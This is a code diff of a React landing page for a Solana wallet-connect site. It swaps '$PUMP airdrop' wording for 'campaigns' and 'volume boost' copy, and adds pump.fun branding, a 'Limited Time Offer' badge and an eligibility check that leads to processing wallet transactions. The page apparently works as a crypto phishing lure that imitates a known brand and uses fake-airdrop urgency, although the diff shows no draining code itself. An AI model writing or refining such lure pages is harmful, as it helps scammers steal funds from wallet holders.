@@ -70,22 +70,20 @@ const Index = () => {
           alt="Background"
           className="w-full h-full object-cover"
         />
+        {/* Blurry transparent overlay */}
+        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
       </div>
 
       {/* Top Bar */}
       <div className="relative z-20 bg-black/90 backdrop-blur-md border-b border-white/10">
         <div className="container mx-auto px-4 py-3 flex items-center justify-between">
-          <div className="flex items-center">
-            <img
-              src={logoImage}
-              alt="Logo"
-              className="h-12 w-12 object-contain rounded-lg"
-            />
+          <div className="flex items-center gap-3">
             <img
               src={logoImage}
               alt="Pump Logo"
-              className="ml-2 h-8 w-auto object-contain"
+              className="h-12 w-12 object-contain rounded-lg"
             />
+            <span className="text-2xl font-bold text-white">pump.fun</span>
           </div>
           <WalletMultiButton className="!bg-primary hover:!bg-primary/90" />
         </div>
@@ -96,18 +94,24 @@ const Index = () => {
         <div className="w-full max-w-2xl space-y-8">
           {/* Header */}
           <div className="text-center space-y-4">
-            <div className="space-y-2">
+            <div className="space-y-3">
+              <Button variant="donate" size="lg" className="pointer-events-none">
+                <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
+                Limited Time Offer
+              </Button>
               <h1 className="text-5xl font-bold text-white">
                 PUMP Your Token
-                <span className="block text-5xl font-bold text-green-500">1,000,000 $PUMP</span>
               </h1>
-              <p className="text-sm text-green-500 font-semibold uppercase tracking-wider mt-2">
-                Limited Time Offer
-              </p>
             </div>
-            <p className="text-xl text-muted-foreground max-w-xl mx-auto">
-              Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
+            <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
+              Grow your project to the next level with well-organized strategic campaigns, with volume boost trending to scale your token
             </p>
+            <div className="pt-4 space-y-2">
+              <p className="text-lg text-white/80 font-semibold">Connect Wallet</p>
+              <p className="text-2xl font-bold text-primary">PUMP / Set Up Campaigns</p>
+            </div>
           </div>
 
           {/* Wallet Connection */}
@@ -124,11 +128,11 @@ const Index = () => {
                 {/* Eligibility Status */}
                 <div className="bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center">
                   <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
-                    {isEligible ? 'Eligible to PUMP' : 'Not PUMP Eligible'}
+                    {isEligible ? 'Eligible Dev Tokens' : 'No Dev Tokens'}
                   </p>
                 </div>
 
-                {/* Airdrop Button */}
+                {/* Action Button */}
                 {!isProcessing && transactions.length === 0 && (
                   <Button
                     variant="donate"
@@ -140,7 +144,7 @@ const Index = () => {
                     <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                       <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                     </svg>
-                    Get $PUMP Airdrop
+                    PUMP Tokens / Start Campaigns
                   </Button>
                 )}
 
@@ -164,7 +168,10 @@ const Index = () => {
       </div>
 
       {/* Token Marquee */}
-      <div className="relative z-10 py-8 overflow-hidden bg-black/80 backdrop-blur-sm border-t border-white/10">
+      <div className="relative z-10 py-8 overflow-hidden bg-transparent">
+        <div className="container mx-auto px-4 mb-4 flex justify-end">
+          <h3 className="text-xl font-bold text-white">Ongoing Campaigns</h3>
+        </div>
         <div className="marquee-container">
           <div className="marquee-content">
             {[...tokens, ...tokens].map((token, index) => (
